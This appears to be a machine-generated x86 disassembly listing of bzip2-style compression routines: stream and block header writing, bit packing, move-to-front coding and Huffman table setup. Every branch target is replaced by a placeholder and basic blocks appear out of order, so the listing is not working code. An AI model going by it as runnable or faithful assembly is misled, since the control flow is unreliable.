mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] 0x0
xor eax eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
sub_40c4d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x44 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x44 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x2c ] edx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x26c ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x260 ]
not edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x260 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x264 ]
shl edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x264 ]
shr ecx 0x1f
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x264 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x264 ]
xor eax [ edx + 0x260 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x264 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x26c ] 0x1
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x44 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40c4b0
add esp 0x4
push 0x42
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c8b0
add esp 0x8
push 0x5a
mov edx [ ebp + 0x8 ]
push edx
call sub_40c8b0
add esp 0x8
push 0x68
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x270 ]
add edx 0x30
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x268 ] 0x2
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] 0x0
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
push 0x31
mov edx [ ebp + 0x8 ]
push edx
call sub_40c8b0
add esp 0x8
push 0x41
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
push 0x59
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c8b0
add esp 0x8
push 0x26
mov edx [ ebp + 0x8 ]
push edx
call sub_40c8b0
add esp 0x8
push 0x53
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
push 0x59
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c8b0
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x260 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c840
add esp 0x8
push 0x0
push 0x1
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
push 0x18
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8d0
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40cca0
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_410950
add esp 0x4
xor edx edx
jne r-xdata
pop ebp
retn
push 0x17
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
push 0x72
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c8b0
add esp 0x8
push 0x45
mov edx [ ebp + 0x8 ]
push edx
call sub_40c8b0
add esp 0x8
push 0x38
mov eax [ ebp + 0x8 ]
push eax
call sub_40c8b0
add esp 0x8
push 0x50
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c8b0
add esp 0x8
push 0x90
mov edx [ ebp + 0x8 ]
push edx
call sub_40c8b0
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x264 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40c840
add esp 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x268 ] 0x2
jl r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_40c720
add esp 0x4
xor ecx ecx
jne r-xdata
sub_40c720
push ebp
mov ebp esp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x258 ]
shr edx 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x258 ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x25c ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x25c ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x25c ] 0x0
jle r-xdata
sub_40c790
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx 0x20
sub edx [ ecx + 0x25c ]
sub edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edx
shl eax cl
mov ecx [ ebp + 0x8 ]
or eax [ ecx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x25c ]
add ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x25c ] ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x258 ]
shr edx 0x18
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4c ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x258 ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x25c ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x25c ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x25c ] 0x8
jl r-xdata
sub_40c840
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
shr eax 0x18
and eax 0xff
push eax
push 0x8
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
mov edx [ ebp + 0xc ]
shr edx 0x10
and edx 0xff
push edx
push 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_40c790
add esp 0xc
mov ecx [ ebp + 0xc ]
shr ecx 0x8
and ecx 0xff
push ecx
push 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_40c790
add esp 0xc
mov eax [ ebp + 0xc ]
and eax 0xff
push eax
push 0x8
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
pop ebp
retn
sub_40c8d0
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_40cc40
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 + 0x278 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x54 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x4 ]
mov [ ebp + ecx - 0x120 ] dl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x44 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
xor eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov cx [ ebp - 0x8 ]
mov [ eax + edx * 2 ] cx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x278 ]
add edx 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x278 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + 0x274 ] eax
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ edx + ecx * 4 ]
sub eax 0x1
mov [ ebp - 0x20 ] eax
jns r-xdata
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0x18 ]
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x20 ]
movzx ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov al [ edx + ecx + 0x158 ]
mov [ ebp - 0x121 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
add edx [ ecx + 0x44 ]
mov [ ebp - 0x20 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 ] 0x0
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x278 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x278 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 ] 0x1
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x27c ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x27c ] eax
jmp r-xdata
xor ecx ecx
jne r-xdata
movzx edx [ ebp - 0x120 ]
movzx eax [ ebp - 0x121 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x2
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov dl [ ebp - 0x11f ]
mov [ ebp - 0x129 ] dl
mov al [ ebp - 0x120 ]
mov [ ebp - 0x11f ] al
lea ecx [ ebp - 0x11f ]
mov [ ebp - 0x128 ] ecx
mov dl [ ebp - 0x121 ]
mov [ ebp - 0x122 ] dl
mov edx [ ebp - 0x18 ]
sub edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov dl [ ebp - 0x129 ]
mov [ ebp - 0x120 ] dl
mov eax [ ebp - 0x128 ]
lea ecx [ ebp - 0x120 ]
sub eax ecx
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x20 ]
add edx 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x27c ]
add edx 0x1
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x27c ] edx
mov edx [ ebp - 0x128 ]
add edx 0x1
mov [ ebp - 0x128 ] edx
mov al [ ebp - 0x129 ]
mov [ ebp - 0x12a ] al
mov ecx [ ebp - 0x128 ]
mov dl [ ecx ]
mov [ ebp - 0x129 ] dl
mov eax [ ebp - 0x128 ]
mov cl [ ebp - 0x12a ]
mov [ eax ] cl
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0x18 ]
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
movzx eax [ ebp - 0x122 ]
movzx ecx [ ebp - 0x129 ]
cmp eax ecx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 ] 0x0
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x278 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x278 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov [ eax + edx * 2 ] 0x1
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x27c ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x27c ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x2
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
jge r-xdata
mov eax 0x1
test eax eax
je r-xdata
sub_40cc40
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x58 ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov al [ edx + 0x54 ]
mov [ ecx + 0x158 ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x54 ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_40cca0
push ebp
mov ebp esp
sub esp 0xbc
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x268 ] 0x3
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
add edx 0x2
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
xor eax eax
jne r-xdata
cmp [ ebp - 0x64 ] 0x6
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x274 ] 0x0
jg r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x274 ] 0xc8
jge r-xdata
push 0xbb9
call sub_4057d5
add esp 0x4
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x274 ] 0x258
jge r-xdata
mov [ ebp - 0x5c ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x64 ]
imul eax eax 0x102
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x9324 ] 0xf
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x274 ] 0x4b0
jge r-xdata
mov [ ebp - 0x5c ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x78 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x274 ]
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x54 ] 0x0
mov eax [ ebp - 0x64 ]
add eax 0x1
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x274 ] 0x960
jge r-xdata
mov [ ebp - 0x5c ] 0x4
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x7c ]
cdq
idiv [ ebp - 0x78 ]
mov [ ebp - 0x74 ] eax
mov ecx [ ebp - 0x54 ]
sub ecx 0x1
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x5c ] 0x6
mov [ ebp - 0x5c ] 0x5
jmp r-xdata
cmp [ ebp - 0xc ] 0x4
jge r-xdata
mov edx [ ebp - 0x50 ]
cmp edx [ ebp - 0x54 ]
jle r-xdata
mov eax [ ebp - 0x40 ]
sub eax 0x1
cmp [ ebp - 0x50 ] eax
jge r-xdata
cmp [ ebp - 0x5c ] 0x8
jl r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x78 ]
cmp eax [ ebp - 0x5c ]
je r-xdata
mov ecx [ ebp - 0x50 ]
add ecx 0x1
mov [ ebp - 0x50 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x70 ]
add ecx [ eax + edx * 4 + 0x278 ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x8000
jge r-xdata
push 0xbba
call sub_4057d5
add esp 0x4
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x5c ]
jge r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
xor ecx ecx
jne r-xdata
cmp [ ebp - 0x78 ] 0x1
je r-xdata
mov edx [ ebp - 0x70 ]
cmp edx [ ebp - 0x74 ]
jge r-xdata
push 0xbbb
call sub_4057d5
add esp 0x4
cmp [ ebp - 0x60 ] 0x4652
jle r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov [ ebp + ecx * 4 - 0x3c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov ecx [ ebp - 0x5c ]
sub ecx [ ebp - 0x78 ]
and ecx 0x80000001
jns r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x5c ]
jge r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x5c ]
jge r-xdata
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x78 ]
sub ecx 0x1
mov [ ebp - 0x78 ] ecx
mov edx [ ebp - 0x50 ]
add edx 0x1
mov [ ebp - 0x54 ] edx
mov eax [ ebp - 0x7c ]
sub eax [ ebp - 0x70 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x54 ]
jl r-xdata
cmp ecx 0x1
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov cl [ ebp - 0x1c ]
mov [ ebp + eax - 0x9c ] cl
jmp r-xdata
cmp [ ebp - 0x5c ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x78 ] 0x0
jle r-xdata
mov edx [ ebp - 0x78 ]
sub edx 0x1
imul edx edx 0x102
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0x9324 ] 0xf
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x50 ]
jg r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x70 ]
sub ecx [ eax + edx * 4 + 0x278 ]
mov [ ebp - 0x70 ] ecx
mov edx [ ebp - 0x50 ]
sub edx 0x1
mov [ ebp - 0x50 ] edx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x60 ]
jge r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x78 ]
sub eax 0x1
imul eax eax 0x102
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0x9324 ] 0x0
jmp r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov dl [ ecx + 0x680 ]
mov [ ebp - 0x91 ] dl
mov [ ebp - 0x6c ] 0x0
mov eax [ ebp - 0x6c ]
mov cl [ ebp + eax - 0x9c ]
mov [ ebp - 0x92 ] cl
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x268 ] 0x3
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x54 ]
cmp edx [ ecx + 0x274 ]
jl r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x64 ]
imul eax eax 0x408
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax + 0xb160 ]
mov eax [ ebp - 0x8 ]
mov [ edx + eax * 4 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x64 ]
cmp edx [ ebp - 0x5c ]
jge r-xdata
mov cl [ ebp - 0x92 ]
mov [ ebp - 0x9c ] cl
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x6c ]
mov [ edx + 0x4cd2 ] al
jmp r-xdata
mov ecx [ ebp - 0x6c ]
add ecx 0x1
mov [ ebp - 0x6c ] ecx
mov dl [ ebp - 0x92 ]
mov [ ebp - 0x93 ] dl
mov eax [ ebp - 0x6c ]
mov cl [ ebp + eax - 0x9c ]
mov [ ebp - 0x92 ] cl
mov edx [ ebp - 0x6c ]
mov al [ ebp - 0x93 ]
mov [ ebp + edx - 0x9c ] al
jmp r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
xor edx edx
jne r-xdata
mov eax [ ebp - 0x54 ]
add eax 0x31
mov [ ebp - 0x50 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x50 ]
cmp edx [ ecx + 0x274 ]
jl r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
movzx ecx [ eax + 0x9426 ]
shl ecx 0x10
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
movzx eax [ edx + 0x9324 ]
or ecx eax
mov edx [ ebp - 0x8 ]
shl edx 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + edx + 0xc990 ] ecx
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
movzx edx [ ecx + 0x962a ]
shl edx 0x10
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
movzx ecx [ eax + 0x9528 ]
or edx ecx
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax + 0xc994 ] edx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x8 ]
movzx eax [ edx + 0x982e ]
shl eax 0x10
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x8 ]
movzx edx [ ecx + 0x972c ]
or eax edx
mov ecx [ ebp - 0x8 ]
shl ecx 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + ecx + 0xc998 ] eax
jmp r-xdata
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
movzx edx [ ebp - 0x91 ]
movzx eax [ ebp - 0x92 ]
cmp edx eax
je r-xdata
mov edx [ ebp - 0x64 ]
cmp edx [ ebp - 0x5c ]
jge r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x274 ]
sub ecx 0x1
mov [ ebp - 0x50 ] ecx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x1c ] 0x10
jge r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x40 ]
jge r-xdata
jmp r-xdata
push 0x11
mov eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp - 0x64 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xb160 ]
push eax
mov ecx [ ebp - 0x64 ]
imul ecx ecx 0x102
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0x9324 ]
push eax
call sub_413940
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x5c ]
jge r-xdata
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x5c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp + eax - 0xac ] 0x0
mov [ ebp - 0x6c ] 0x0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x11
jle r-xdata
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x9324 ]
cmp ecx [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x64 ]
add ecx 0x1
mov [ ebp - 0x64 ] ecx
xor eax eax
jne r-xdata
xor edx edx
jne r-xdata
cmp [ ebp - 0x5c ] 0x6
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov [ ebp + ecx * 2 - 0x4c ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x10
jge r-xdata
cmp [ ebp - 0x6c ] 0x10
jge r-xdata
cmp [ ebp - 0x4 ] 0x1
jge r-xdata
push 0xbbc
call sub_4057d5
add esp 0x4
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x9324 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov edx [ ebp - 0x64 ]
imul edx edx 0x102
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x9324 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x54 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
sub edx [ ebp - 0x54 ]
add edx 0x1
cmp edx 0x32
jne r-xdata
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
movzx ecx [ ebp + eax - 0xac ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x1c ]
shl edx 0x4
add edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + edx + 0x58 ]
test ecx ecx
je r-xdata
mov edx [ ebp - 0x40 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
